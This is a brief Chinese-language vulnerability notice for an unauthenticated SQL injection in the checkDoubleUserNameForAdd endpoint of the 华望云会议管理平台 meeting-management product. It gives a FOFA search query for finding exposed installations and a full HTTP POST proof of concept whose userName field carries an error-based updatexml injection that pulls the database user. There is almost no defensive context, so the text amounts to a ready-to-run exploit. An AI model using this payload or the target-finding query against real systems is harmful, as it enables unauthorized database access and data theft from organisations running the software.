# 华望云会议管理平台checkDoubleUserNameForAdd存在SQL注入漏洞

华望云会议管理平台checkDoubleUserNameForAdd存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

## fofa

```kotlin
title="华望云会议管理平台"
```

## poc

```javascript
POST /ajax/checkDoubleUserNameForAdd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

userName=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'
```

